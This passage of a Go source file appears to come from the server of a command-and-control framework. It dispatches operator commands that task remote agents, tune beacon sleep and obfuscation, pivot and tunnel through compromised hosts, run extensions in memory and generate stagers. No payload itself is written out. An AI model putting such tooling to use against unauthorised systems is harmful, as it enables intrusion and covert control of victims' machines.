package link

import (
	"errors"
	"fmt"
	"log/slog"
	"net"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/alias"
	"github.com/thesyntax1/UmbraC2/server/internal/armory"
	"github.com/thesyntax1/UmbraC2/server/internal/audit"
	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/hub"
	"github.com/thesyntax1/UmbraC2/server/internal/pivot"
	"github.com/thesyntax1/UmbraC2/server/internal/rbac"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/stager"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
	"github.com/thesyntax1/UmbraC2/server/internal/upk"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// Task kinds the server itself is allowed to synthesise.
const (
	TaskKindExit = "exit"
	// TaskKindExtension runs an armory extension in memory on an agent.
	TaskKindExtension = "ext"
)

// serveOperatorTCP runs a persistent operator control channel.
func (s *Server) serveOperatorTCP(conn net.Conn) {
	defer conn.Close()
	addr := conn.RemoteAddr().String()
	log := s.Log.With("peer", addr, "transport", "tcp/operator")

	if err := conn.SetDeadline(time.Now().Add(s.Cfg.HandshakeTimeout())); err != nil {
		return
	}
	stream := NewConnStream(conn)
	sess, info, err := Handshake(stream, s.Cfg, log, addr)
	if err != nil {
		s.guard.Fail(addr)
		log.Warn("operator handshake failed", "err", err)
		return
	}
	if info.Role != crypt.RoleOperator {
		log.Warn("agent key used on the operator listener")
		return
	}
	s.runOperator(stream, conn, sess, info, addr, "tcp/operator", log)
}

// runOperator carries the control channel of an operator that already
// completed the handshake.
//
// Like runAgent, the handshake lives in the listener: the TLS listener
// decides by the role in the HELLO whether the peer is an operator or an
// agent, and only then hands the connection over.
func (s *Server) runOperator(stream FrameStream, conn net.Conn, sess *session.Session, info *HelloInfo, addr, transport string, log *slog.Logger) {
	if !s.claimOperatorSlot() {
		log.Warn("operator limit reached, rejecting", "operator", info.ID)
		return
	}
	defer s.releaseOperatorSlot()
	if err := conn.SetDeadline(time.Time{}); err != nil {
		return
	}

	role := s.Cfg.Keyring.Role(info.ID)
	op := s.Hub.Subscribe(info.ID, role, addr, transport)
	defer s.Hub.Unsubscribe(op.ID)
	defer s.forgetOperatorRate(info.ID)
	log.Info("operator connected", "operator", info.ID, "role", role, "suite", wire.SuiteName(info.Suite))

	// The event pusher and the request handler below both write to this
	// connection, so every frame goes through one Sender to keep the peer's
	// nonce counter strictly increasing. See sender.go.
	send := NewSender(sess, stream)

	done := make(chan struct{})
	defer close(done)

	// Push events to the operator as they happen.
	go func() {
		for {
			select {
			case ev, ok := <-op.Events:
				if !ok {
					return
				}
				if err := send.Send(wire.MsgOpEvent, eventMap(ev)); err != nil {
					log.Debug("operator event write failed", "err", err)
					return
				}
			case <-done:
				return
			}
		}
	}()

	for {
		raw, err := stream.ReadFrame()
		if err != nil {
			log.Info("operator disconnected", "operator", info.ID)
			return
		}
		msgType, req, err := sess.OpenMessage(raw)
		if err != nil {
			log.Warn("operator frame rejected", "err", err)
			return
		}
		if msgType == wire.MsgPadding {
			// Padding frames carry random bytes and are ignored.
			continue
		}
		if msgType != wire.MsgOpRequest {
			log.Warn("unexpected frame from operator", "type", wire.TypeName(msgType))
			continue
		}
		resp := s.dispatch(log, op, req)
		if err := send.Send(wire.MsgOpResponse, resp); err != nil {
			log.Warn("operator response write failed", "err", err)
			return
		}
	}
}

// dispatch executes one operator RPC. Errors are returned *inside* the
// response so the operator UI can show them without losing the session.
// dispatch executes one RPC and records it in the audit log.
//
// Auditing wraps the real handler rather than living inside it so that no RPC
// can be added without being logged: there is exactly one code path in.
func (s *Server) dispatch(log *slog.Logger, op *hub.Operator, req map[string]any) upk.Map {
	started := time.Now()
	cmd, _ := req["cmd"].(string)
	args, _ := req["args"].(map[string]any)
	if args == nil {
		args = map[string]any{}
	}

	out := s.handleRPC(log, op, req)
	ok, _ := out["ok"].(bool)
	errText, _ := out["err"].(string)

	var taskID, agentID string
	if out["data"] != nil {
		if data, isMap := out["data"].(upk.Map); isMap {
			taskID, _ = data["task_id"].(string)
			agentID, _ = data["agent_id"].(string)
		}
	}
	if taskID == "" {
		taskID, _ = args["task_id"].(string)
	}
	if agentID == "" {
		agentID, _ = args["id"].(string)
	}
	s.record(op, cmd, args, ok, errText, agentID, taskID, time.Since(started).Milliseconds())
	return out
}

// record writes one audit line. Auditing never fails an RPC: a disk problem is
// logged, because refusing to work is worse than a gap in the trail.
func (s *Server) record(op *hub.Operator, cmd string, args map[string]any, ok bool, errText, agentID, taskID string, ms int64) {
	if s.audit == nil {
		return
	}
	// Sorted key=value rather than %v of a map: the audit log is diffed and
	// grepped, and Go randomises map iteration order.
	detail := ""
	if len(args) > 0 {
		keys := make([]string, 0, len(args))
		for k := range args {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		parts := make([]string, 0, len(keys))
		for _, k := range keys {
			parts = append(parts, fmt.Sprintf("%s=%v", k, args[k]))
		}
		detail = audit.Clip(strings.Join(parts, " "))
	}
	name := ""
	peer, transport := "", ""
	if op != nil {
		name, peer, transport = op.Name, op.Peer, op.Transport
	}
	err := s.audit.Record(audit.Entry{
		Operator:  name,
		Peer:      peer,
		Transport: transport,
		Cmd:       cmd,
		OK:        ok,
		Err:       errText,
		AgentID:   agentID,
		TaskID:    taskID,
		Detail:    detail,
		Millis:    ms,
	})
	if err != nil {
		s.Log.Warn("audit write failed", "err", err, "cmd", cmd, "operator", name)
	}
}

func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]any) upk.Map {
	rid, _ := number(req["rid"])
	cmd, _ := req["cmd"].(string)
	args, _ := req["args"].(map[string]any)
	if args == nil {
		args = map[string]any{}
	}
	resp := upk.Map{"rid": rid, "ok": false, "data": upk.Map{}}

	reply := func(data upk.Map) upk.Map {
		resp["ok"] = true
		resp["data"] = data
		return resp
	}
	fail := func(format string, a ...any) upk.Map {
		resp["err"] = fmt.Sprintf(format, a...)
		return resp
	}

	log.Debug("operator rpc", "operator", op.Name, "cmd", cmd)

	// Authorisation comes first: an unauthorised call must not consume the
	// rate budget (a viewer polling a denied command should not lock itself
	// out of the commands it *can* run) and must be visible in the audit log.
	if !rbac.Allowed(op.Role, strings.TrimSpace(cmd)) {
		return fail("permission denied: %q requires role %s (you are %s)",
			strings.TrimSpace(cmd), rbac.MinRole(strings.TrimSpace(cmd)), op.Role)
	}

	// The limiter sits inside the handler so a rate-limited call is still
	// audited: "operator tried to flood" is exactly the kind of thing the log
	// exists to show.
	if !s.allowOperatorRPC(op.Name) {
		return fail("rate limited: at most %d calls/s per operator", int(operatorRPCPerSec))
	}
	// Presence: operators.list shows who is idle. A rate-limited call does not
	// count as activity.
	s.Hub.Touch(op.Name)

	switch strings.TrimSpace(cmd) {
	case "ping":
		return reply(upk.Map{"pong": time.Now().Unix()})

	case "whoami":
		caps := rbac.CapabilitiesFor(op.Role)
		sort.Strings(caps)
		out := make([]any, 0, len(caps))
		for _, c := range caps {
			out = append(out, c)
		}
		return reply(upk.Map{
			"name":         op.Name,
			"role":         op.Role,
			"peer":         op.Peer,
			"transport":    op.Transport,
			"since":        op.Since.Format(time.RFC3339),
			"focus":        op.Focus,
			"capabilities": out,
		})

	case "operators.focus":
		id, _ := args["id"].(string)
		if id != "" {
			if _, ok := s.Hub.Store().Agent(id); !ok {
				return fail("operators.focus: unknown agent %q", id)
			}
		}
		previous, ok := s.Hub.SetFocus(op.Name, id)
		if !ok {
			return fail("operators.focus: %q is not a connected operator", op.Name)
		}
		return reply(upk.Map{"operator": op.Name, "agent_id": id, "previous": previous})

	case "audit.tail":
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		if limit > 1000 {
			limit = 1000
		}
		entries := s.audit.Tail(int(limit))
		out := make([]any, 0, len(entries))
		for _, e := range entries {
			out = append(out, upk.Map{
				"at":        e.At.Unix(),
				"operator":  e.Operator,
				"peer":      e.Peer,
				"transport": e.Transport,
				"cmd":       e.Cmd,
				"ok":        e.OK,
				"err":       e.Err,
				"agent_id":  e.AgentID,
				"task_id":   e.TaskID,
				"detail":    e.Detail,
				"ms":        e.Millis,
			})
		}
		return reply(upk.Map{"entries": out, "enabled": s.audit.Enabled()})

	case "server.stats":
		return reply(toUpkMap(s.Hub.Stats()))

	case "chat.send":
		text, _ := args["text"].(string)
		text = strings.TrimSpace(text)
		if text == "" {
			return fail("chat.send needs non-empty text")
		}
		if len(text) > 2000 {
			text = text[:2000]
		}
		to, _ := args["to"].(string)
		to = strings.TrimSpace(to)
		if to != "" && !s.Hub.HasOperator(to) {
			return fail("chat.send: %q is not a connected operator", to)
		}
		msg := s.Hub.Say(op.Name, op.Role, text, to)
		out := upk.Map{"at": msg.At.Unix(), "from": msg.From}
		if msg.To != "" {
			out["to"] = msg.To
		}
		return reply(out)

	case "chat.history":
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		if limit > int64(hub.MaxChatHistory) {
			limit = int64(hub.MaxChatHistory)
		}
		messages := s.Hub.Chat(int(limit))
		out := make([]any, 0, len(messages))
		for _, m := range messages {
			row := upk.Map{
				"from": m.From,
				"role": m.Role,
				"text": m.Text,
				"at":   m.At.Unix(),
			}
			if m.To != "" {
				row["to"] = m.To
			}
			out = append(out, row)
		}
		return reply(upk.Map{"messages": out})

	case "schedule.add":
		agentID, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		every, ok := asInt64(args["every"])
		if !ok {
			return fail("schedule.add needs a numeric \"every\" (seconds)")
		}
		taskArgs, _ := args["args"].(map[string]any)
		if _, exists := s.Hub.Store().Agent(agentID); !exists {
			return fail("schedule.add: unknown agent %q", agentID)
		}
		sc, err := s.Hub.Store().AddSchedule(&store.Schedule{
			AgentID:   agentID,
			Kind:      kind,
			Args:      taskArgs,
			EverySec:  int(every),
			CreatedBy: op.Name,
		})
		if err != nil {
			return fail("schedule.add: %v", err)
		}
		s.Hub.Store().SaveAsync()
		s.Hub.Emit(hub.Event{Kind: "schedule.created", AgentID: sc.AgentID, Data: map[string]any{
			"schedule_id": sc.ID, "kind": sc.Kind, "every": sc.EverySec,
		}})
		return reply(upk.Map{
			"schedule_id": sc.ID,
			"agent_id":    sc.AgentID,
			"kind":        sc.Kind,
			"every":       int64(sc.EverySec),
			"next_run":    sc.NextRun.Unix(),
		})

	case "schedule.list":
		all := s.Hub.Store().Schedules()
		out := make([]any, 0, len(all))
		for _, sc := range all {
			out = append(out, scheduleMap(sc))
		}
		return reply(upk.Map{"schedules": out})

	case "schedule.remove":
		id, _ := args["schedule_id"].(string)
		if id == "" {
			return fail("schedule.remove needs schedule_id")
		}
		if !s.Hub.Store().RemoveSchedule(id) {
			return fail("schedule.remove: unknown schedule %q", id)
		}
		s.Hub.Store().SaveAsync()
		s.Hub.Emit(hub.Event{Kind: "schedule.removed", Data: map[string]any{"schedule_id": id}})
		return reply(upk.Map{"schedule_id": id, "removed": true})

	case "operators.list":
		ops := s.Hub.Operators()
		out := make([]any, 0, len(ops))
		for _, o := range ops {
			out = append(out, upk.Map{
				"id":        o.ID,
				"name":      o.Name,
				"peer":      o.Peer,
				"transport": o.Transport,
				"since":     o.Since,
				"backlog":   int64(o.Backlog),
				"focus":     o.Focus,
				"focus_at":  o.FocusAt,
				"idle_sec":  int64(o.IdleSec),
			})
		}
		return reply(upk.Map{"operators": out, "count": int64(len(out))})

	case "agents.list":
		filter := agentFilter(args)
		agents := s.Hub.SelectAgents(filter)
		out := make([]any, 0, len(agents))
		for _, a := range agents {
			out = append(out, toUpkMap(agentDataMap(a)))
		}
		return reply(upk.Map{"agents": out, "count": len(out)})

	case "agents.tag":
		tags := stringList(args["tags"])
		if len(tags) == 0 {
			if tag, ok := args["tag"].(string); ok && tag != "" {
				tags = []string{tag}
			}
		}
		if len(tags) == 0 {
			return fail("agents.tag needs at least one tag")
		}
		mode := "add"
		if m, ok := args["mode"].(string); ok && m != "" {
			mode = m
		}
		if mode != "add" && mode != "remove" && mode != "set" {
			return fail("agents.tag: mode must be add, remove or set")
		}
		targets, err := s.selectTargets(args)
		if err != nil {
			return fail("agents.tag: %v", err)
		}
		updated := make([]any, 0, len(targets))
		for _, a := range targets {
			if err := s.Hub.SetTags(a.ID, tags, mode); err != nil {
				continue
			}
			updated = append(updated, a.ID)
		}
		return reply(upk.Map{"updated": updated, "tags": tags, "mode": mode})

	case "agents.policy":
		sleep, ok1 := asInt64(args["sleep"])
		jitter, ok2 := asInt64(args["jitter"])
		if !ok1 || !ok2 {
			return fail("agents.policy needs numeric sleep and jitter")
		}
		// The obfuscation flag is optional: a caller that only wants to
		// change the interval must not switch the obfuscation off.
		var obfuscate *bool
		if v, ok := args["obfuscate"].(bool); ok {
			obfuscate = &v
		}
		targets, err := s.selectTargets(args)
		if err != nil {
			return fail("agents.policy: %v", err)
		}
		updated := make([]any, 0, len(targets))
		for _, a := range targets {
			if err := s.Hub.SetPolicyFull(a.ID, int(sleep), int(jitter), obfuscate); err != nil {
				continue
			}
			updated = append(updated, a.ID)
		}
		out := upk.Map{"updated": updated, "sleep": sleep, "jitter": jitter}
		if obfuscate != nil {
			out["obfuscate"] = *obfuscate
		}
		return reply(out)

	case "agents.info":
		id, _ := args["id"].(string)
		a, ok := s.Hub.Store().Agent(id)
		if !ok {
			return fail("unknown agent %q", id)
		}
		hist := s.Hub.Store().AgentTasks(id, 20)
		tasks := make([]any, 0, len(hist))
		for _, t := range hist {
			tasks = append(tasks, taskMap(t))
		}
		data := toUpkMap(agentDataMap(a))
		data["tasks"] = tasks
		if live, ok := s.Hub.Live(id); ok {
			data["live"] = upk.Map{
				"transport": live.Transport,
				"addr":      live.Addr,
				"suite":     wire.SuiteName(live.Suite),
				"since":     live.Since.Format(time.RFC3339),
				"session":   live.SessionID,
			}
		}
		return reply(data)

	case "task.submit":
		id, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		taskArgs, _ := args["args"].(map[string]any)
		t, err := s.Hub.SubmitTask(id, kind, taskArgs)
		if err != nil {
			return fail("task.submit: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "state": t.State})

	case "task.claim":
		taskID, _ := args["task_id"].(string)
		t, err := s.Hub.ClaimTask(taskID, op.Name)
		if err != nil {
			return fail("task.claim: %v", err)
		}
		return reply(upk.Map{
			"task_id": t.ID, "agent_id": t.AgentID, "claimed_by": t.ClaimedBy,
			"state": t.State,
		})

	case "task.release":
		taskID, _ := args["task_id"].(string)
		t, err := s.Hub.ReleaseTask(taskID, op.Name)
		if err != nil {
			return fail("task.release: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "claimed_by": t.ClaimedBy})

	case "task.cancel":
		taskID, _ := args["task_id"].(string)
		if !s.Hub.CancelTask(taskID) {
			return fail("task %q cannot be cancelled", taskID)
		}
		return reply(upk.Map{"task_id": taskID, "state": store.TaskCancelled})

	case "task.list":
		id, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		state, _ := args["state"].(string)
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		hist := s.Hub.Store().FilteredTasks(id, kind, state, int(limit))
		tasks := make([]any, 0, len(hist))
		for _, t := range hist {
			tasks = append(tasks, taskMap(t))
		}
		return reply(upk.Map{"tasks": tasks, "count": len(tasks)})

	case "task.bulk":
		kind, _ := args["kind"].(string)
		if kind == "" {
			return fail("task.bulk needs a task kind")
		}
		taskArgs, _ := args["args"].(map[string]any)
		targets, err := s.selectTargets(args)
		if err != nil {
			return fail("task.bulk: %v", err)
		}
		rows := make([]any, 0, len(targets))
		for _, a := range targets {
			t, err := s.Hub.SubmitTask(a.ID, kind, taskArgs)
			if err != nil {
				rows = append(rows, upk.Map{"agent_id": a.ID, "error": err.Error()})
				continue
			}
			rows = append(rows, upk.Map{
				"agent_id": a.ID, "task_id": t.ID, "state": t.State,
			})
		}
		return reply(upk.Map{"tasks": rows, "count": len(rows)})

	case "task.get":
		taskID, _ := args["task_id"].(string)
		t, ok := s.Hub.Store().Task(taskID)
		if !ok {
			return fail("unknown task %q", taskID)
		}
		return reply(taskMap(t))

	case "agents.sleep":
		id, _ := args["id"].(string)
		sleep, ok1 := asInt64(args["sleep"])
		jitter, ok2 := asInt64(args["jitter"])
		if !ok1 || !ok2 {
			return fail("agents.sleep needs numeric sleep and jitter")
		}
		if err := s.Hub.SetPolicy(id, int(sleep), int(jitter)); err != nil {
			return fail("agents.sleep: %v", err)
		}
		return reply(upk.Map{"id": id, "sleep": sleep, "jitter": jitter})

	case "agents.kill", "agents.exit":
		id, _ := args["id"].(string)
		t, err := s.Hub.SubmitTask(id, TaskKindExit, map[string]any{})
		if err != nil {
			return fail("%s: %v", cmd, err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": id})

	case "events.test":
		s.Hub.Emit(hub.Event{Kind: "operator.test", Data: map[string]any{"from": op.Name}})
		return reply(upk.Map{"emitted": true})

	// ---- pivoting ----------------------------------------------------
	case "pivot.list":
		tunnels := []pivot.TunnelInfo{}
		sessions := 0
		if s.Pivot != nil {
			tunnels = s.Pivot.List()
			sessions = s.Pivot.Sessions()
		}
		out := make([]any, 0, len(tunnels))
		for _, t := range tunnels {
			out = append(out, upk.Map{
				"stream":     t.Stream,
				"agent_id":   t.AgentID,
				"mode":       t.Mode,
				"listen":     t.Listen,
				"host":       t.Host,
				"port":       int64(t.Port),
				"opened":     t.Opened.Unix(),
				"streams":    int64(t.Streams),
				"bytes_up":   t.BytesUp,
				"bytes_down": t.BytesDown,
				"state":      t.State,
			})
		}
		return reply(upk.Map{"tunnels": out, "sessions": int64(sessions)})

	case "pivot.open":
		if s.Pivot == nil {
			return fail("pivot.open: pivoting is not enabled on this server")
		}
		id, _ := args["id"].(string)
		if _, ok := s.Hub.Store().Agent(id); !ok {
			return fail("pivot.open: unknown agent %q", id)
		}
		mode, _ := args["mode"].(string)
		host, _ := args["host"].(string)
		listen, _ := args["listen"].(string)
		port, _ := asInt64(args["port"])
		tun, err := s.Pivot.Open(id, mode, host, int(port), listen)
		if err != nil {
			return fail("pivot.open: %v", err)
		}
		return reply(upk.Map{
			"stream":   tun.Stream,
			"agent_id": tun.AgentID,
			"mode":     tun.Mode,
			"listen":   tun.Listen,
			"host":     tun.Host,
			"port":     int64(tun.Port),
		})

	case "pivot.close":
		if s.Pivot == nil {
			return fail("pivot.close: pivoting is not enabled on this server")
		}
		stream, _ := args["stream"].(string)
		if err := s.Pivot.Close(stream); err != nil {
			return fail("pivot.close: %v", err)
		}
		return reply(upk.Map{"stream": stream, "closed": true})

	// ---- layer-3 tunnel ----------------------------------------------
	case "vpn.status":
		if s.VPN == nil {
			return reply(upk.Map{"enabled": false})
		}
		status := s.VPN.Status()
		status["enabled"] = true
		return reply(toUpkMap(status))

	case "vpn.peers":
		if s.VPN == nil {
			return reply(upk.Map{"peers": []any{}})
		}
		peers := s.VPN.Peers()
		out := make([]any, 0, len(peers))
		for _, p := range peers {
			out = append(out, upk.Map{
				"id":        p.ID,
				"address":   p.Address,
				"endpoint":  p.Endpoint,
				"agent":     p.Agent,
				"live":      p.Live,
				"bytes_in":  p.BytesIn,
				"bytes_out": p.BytesOut,
				"last_seen": p.LastSeen,
			})
		}
		return reply(upk.Map{"peers": out, "count": int64(len(out))})

	case "vpn.allocate":
		if s.VPN == nil {
			return fail("vpn.allocate: the tunnel is not enabled on this server")
		}
		id, _ := args["id"].(string)
		if id == "" {
			return fail("vpn.allocate needs an agent id")
		}
		if _, ok := s.Hub.Store().Agent(id); !ok {
			return fail("vpn.allocate: unknown agent %q", id)
		}
		ip, err := s.VPN.Allocate(id)
		if err != nil {
			return fail("vpn.allocate: %v", err)
		}
		return reply(upk.Map{"id": id, "address": ip.String()})

	// ---- extensions ---------------------------------------------------
	case "armory.list":
		if s.Armory == nil {
			return reply(upk.Map{"entries": []any{}, "installed": []any{}})
		}
		cat := s.Armory.Catalog()
		entries := make([]any, 0, len(cat.Entries))
		for _, m := range cat.Entries {
			entries = append(entries, upk.Map{
				"name":        m.Name,
				"version":     m.Version,
				"os":          m.OS,
				"arch":        m.Arch,
				"format":      m.Format,
				"sha256":      m.SHA256,
				"size":        m.Size,
				"description": m.Description,
				"args":        stringsToAny(m.Args),
			})
		}
		installed := s.Armory.List()
		rows := make([]any, 0, len(installed))
		for _, ext := range installed {
			rows = append(rows, upk.Map{
				"name":      ext.Manifest.Name,
				"version":   ext.Manifest.Version,
				"sha256":    ext.Manifest.SHA256,
				"size":      ext.Bytes,
				"installed": ext.Installed.Unix(),
			})
		}
		return reply(upk.Map{
			"entries":   entries,
			"installed": rows,
			"verified":  s.Armory.Verified(),
		})

	case "armory.install":
		if s.Armory == nil {
			return fail("armory.install: the extension registry is not enabled")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("armory.install needs a name")
		}
		ext, err := s.Armory.InstallFrom(name)
		if err != nil {
			return fail("armory.install: %v", err)
		}
		return reply(upk.Map{
			"name":      ext.Manifest.Name,
			"sha256":    ext.Manifest.SHA256,
			"size":      ext.Bytes,
			"installed": ext.Installed.Unix(),
		})

	case "armory.remove":
		if s.Armory == nil {
			return fail("armory.remove: the extension registry is not enabled")
		}
		name, _ := args["name"].(string)
		if err := s.Armory.Remove(name); err != nil {
			return fail("armory.remove: %v", err)
		}
		return reply(upk.Map{"name": name, "removed": true})

	case "armory.run":
		name, _ := args["name"].(string)
		agentID, _ := args["id"].(string)
		taskArgs, _ := args["args"].(map[string]any)
		t, err := s.submitExtension(agentID, name, taskArgs)
		if err != nil {
			return fail("armory.run: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name})

	// ---- runtime command namespace -----------------------------------
	case "alias.list":
		aliases := []alias.Alias{}
		if s.Aliases != nil {
			aliases = s.Aliases.List()
		}
		out := make([]any, 0, len(aliases))
		for _, a := range aliases {
			out = append(out, upk.Map{
				"name":        a.Name,
				"kind":        a.Kind,
				"extension":   a.Extension,
				"args":        toUpkMap(a.Args),
				"args_spec":   stringsToAny(a.ArgsSpec),
				"description": a.Description,
				"by":          a.CreatedBy,
				"created":     a.Created.Unix(),
			})
		}
		return reply(upk.Map{"aliases": out, "count": int64(len(out))})

	case "alias.run":
		if s.Aliases == nil {
			return fail("alias.run: the command namespace is not enabled")
		}
		name, _ := args["name"].(string)
		agentID, _ := args["id"].(string)
		extra, _ := args["args"].(map[string]any)
		kind, merged, extension, err := s.Aliases.Expand(name, extra)
		if err != nil {
			return fail("alias.run: %v", err)
		}
		if extension != "" {
			t, err := s.submitExtension(agentID, extension, merged)
			if err != nil {
				return fail("alias.run: %v", err)
			}
			return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name})
		}
		t, err := s.Hub.SubmitTask(agentID, kind, merged)
		if err != nil {
			return fail("alias.run: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name, "kind": kind})

	// ---- team synchronisation ----------------------------------------
	case "team.sync":
		agents := s.Hub.Agents()
		agentRows := make([]any, 0, len(agents))
		for _, a := range agents {
			agentRows = append(agentRows, toUpkMap(a))
		}
		ops := s.Hub.Operators()
		opRows := make([]any, 0, len(ops))
		for _, o := range ops {
			opRows = append(opRows, upk.Map{
				"name":      o.Name,
				"role":      o.Role,
				"peer":      o.Peer,
				"transport": o.Transport,
				"since":     o.Since,
				"focus":     o.Focus,
				"focus_at":  o.FocusAt,
				"idle_sec":  int64(o.IdleSec),
			})
		}
		messages := s.Hub.Chat(50)
		chatRows := make([]any, 0, len(messages))
		for _, m := range messages {
			row := upk.Map{
				"from": m.From,
				"role": m.Role,
				"text": m.Text,
				"at":   m.At.Unix(),
			}
			if m.To != "" {
				row["to"] = m.To
			}
			chatRows = append(chatRows, row)
		}
		return reply(upk.Map{
			"server_time": time.Now().Unix(),
			"version":     hub.Version,
			"agents":      agentRows,
			"operators":   opRows,
			"chat":        chatRows,
		})

	// ---- stagers ------------------------------------------------------
	case "stager.generate":
		platform, _ := args["platform"].(string)
		transport, _ := args["transport"].(string)
		server, _ := args["server"].(string)
		url, _ := args["url"].(string)
		digest, _ := args["sha256"].(string)
		agentID, _ := args["agent_id"].(string)
		if server == "" {
			server = s.Cfg.Server.AgentListen
		}
		opts := stager.Options{
			Platform:  platform,
			Transport: transport,
			Server:    server,
			HTTPPath:  s.Cfg.Server.HTTPPath,
			URL:       url,
			SHA256:    digest,
			PSK:       s.Cfg.Keyring.AgentPSK,
			AgentID:   agentID,
		}
		script, err := stager.Render(opts)
		if err != nil {
			return fail("stager.generate: %v", err)
		}
		// The stager carries the agent PSK: it is a secret and must not be
		// pasted into a ticket. The audit log records that it was generated.
		return reply(upk.Map{
			"platform":  platform,
			"transport": transport,
			"server":    server,
			"stager":    script,
		})

	default:
		return fail("unknown command %q", cmd)
	}
}

// submitExtension ships an installed extension to an agent.
//
// The blob travels inside the task arguments, so it is bounded by the frame
// limit: extensions are small in-memory modules, not payloads.
func (s *Server) submitExtension(agentID, name string, args map[string]any) (*store.Task, error) {
	if s.Armory == nil {
		return nil, errors.New("the extension registry is not enabled")
	}
	ext, ok := s.Armory.Get(name)
	if !ok {
		return nil, fmt.Errorf("extension %q is not installed", name)
	}
	blob, err := os.ReadFile(ext.Path)
	if err != nil {
		return nil, fmt.Errorf("read extension %q: %w", name, err)
	}
	if len(blob) > armory.MaxBlobSize {
		return nil, fmt.Errorf("extension %q is too large to run in one frame", name)
	}
	if args == nil {
		args = map[string]any{}
	}
	return s.Hub.SubmitTask(agentID, TaskKindExtension, upk.Map{
		"name": name,
		"data": blob,
		"args": toUpkMap(args),
	})
}

// stringsToAny converts a string slice into an upk-encodable slice.
func stringsToAny(in []string) []any {
	out := make([]any, 0, len(in))
	for _, s := range in {
		out = append(out, s)
	}
	return out
}

func eventMap(ev hub.Event) upk.Map {
	m := upk.Map{
		"kind": ev.Kind,
		"at":   ev.At.Unix(),
	}
	if ev.AgentID != "" {
		m["agent_id"] = ev.AgentID
	}
	if ev.TaskID != "" {
		m["task_id"] = ev.TaskID
	}
	if ev.From != "" {
		m["from"] = ev.From
	}
	if ev.To != "" {
		m["to"] = ev.To
	}
	if ev.Data != nil {
		m["data"] = toUpkMap(ev.Data)
	}
	return m
}

func scheduleMap(sc *store.Schedule) upk.Map {
	return upk.Map{
		"id":        sc.ID,
		"agent_id":  sc.AgentID,
		"kind":      sc.Kind,
		"args":      toUpkMap(sc.Args),
		"every":     int64(sc.EverySec),
		"enabled":   sc.Enabled,
		"runs":      int64(sc.Runs),
		"next_run":  sc.NextRun.Unix(),
		"created":   sc.Created.Unix(),
		"last_task": sc.LastTask,
		"by":        sc.CreatedBy,
	}
}

func taskMap(t *store.Task) upk.Map {
	m := upk.Map{
		"id":       t.ID,
		"agent_id": t.AgentID,
		"kind":     t.Kind,
		"state":    t.State,
		"code":     t.Code,
		"args":     toUpkMap(t.Args),
		"created":  t.Created.Unix(),
	}
	if t.Err != "" {
		m["err"] = t.Err
	}
	if len(t.Output) > 0 {
		m["out"] = t.Output
	}
	if !t.Completed.IsZero() {
		m["completed"] = t.Completed.Unix()
	}
	if len(t.Meta) > 0 {
		m["meta"] = toUpkMap(t.Meta)
	}
	if t.ClaimedBy != "" {
		m["claimed_by"] = t.ClaimedBy
		m["claimed_at"] = t.ClaimedAt.Unix()
	}
	return m
}

func agentDataMap(a *store.Agent) map[string]any {
	return map[string]any{
		"id":         a.ID,
		"host":       a.Host,
		"os":         a.OS,
		"arch":       a.Arch,
		"user":       a.User,
		"pid":        a.PID,
		"version":    a.Version,
		"transport":  a.Transport,
		"addr":       a.Addr,
		"sleep":      a.Sleep,
		"jitter":     a.Jitter,
		"state":      a.State,
		"checkins":   a.Checkins,
		"tags":       a.Tags,
		"first_seen": a.FirstSeen.Format(time.RFC3339),
		"last_seen":  a.LastSeen.Format(time.RFC3339),
	}
}

// stringList reads a list of strings from an RPC argument.
//
// A single comma separated string is accepted as well: an operator types
// "a,b,c" far more often than a script builds a list.
func stringList(v any) []string {
	switch items := v.(type) {
	case []any:
		out := make([]string, 0, len(items))
		for _, item := range items {
			if s, ok := item.(string); ok && s != "" {
				out = append(out, s)
			}
		}
		return out
	case []string:
		return items
	case string:
		parts := strings.Split(items, ",")
		out := make([]string, 0, len(parts))
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if p != "" {
				out = append(out, p)
			}
		}
		return out
	}
	return nil
}

// agentFilter reads the filter of an RPC argument.
//
// The filter may sit in a nested "filter" map or as flat arguments, so both
// `{"filter":{"state":"online"}}` and `{"state":"online"}` work.
func agentFilter(args map[string]any) hub.AgentFilter {
	f := hub.AgentFilter{}
	read := func(m map[string]any) {
		if v, ok := m["state"].(string); ok && v != "" {
			f.State = v
		}
		if v, ok := m["transport"].(string); ok && v != "" {
			f.Transport = v
		}
		if v, ok := m["os"].(string); ok && v != "" {
			f.OS = v
		}
		if v, ok := m["arch"].(string); ok && v != "" {
			f.Arch = v
		}
		if v, ok := m["tag"].(string); ok && v != "" {
			f.Tag = v
		}
		if v, ok := m["user"].(string); ok && v != "" {
			f.User = v
		}
		if ids := stringList(m["agents"]); len(ids) > 0 {
			f.IDs = ids
		}
	}
	if raw, ok := args["filter"].(map[string]any); ok {
		read(raw)
	}
	read(args)
	return f
}

// selectTargets resolves the agents an operation applies to.
//
// The operator either names the agents or describes them with a filter.  An
// operation without either is refused: a bulk task that hits every agent in
// the inventory because a filter was forgotten is not recoverable.
func (s *Server) selectTargets(args map[string]any) ([]*store.Agent, error) {
	filter := agentFilter(args)
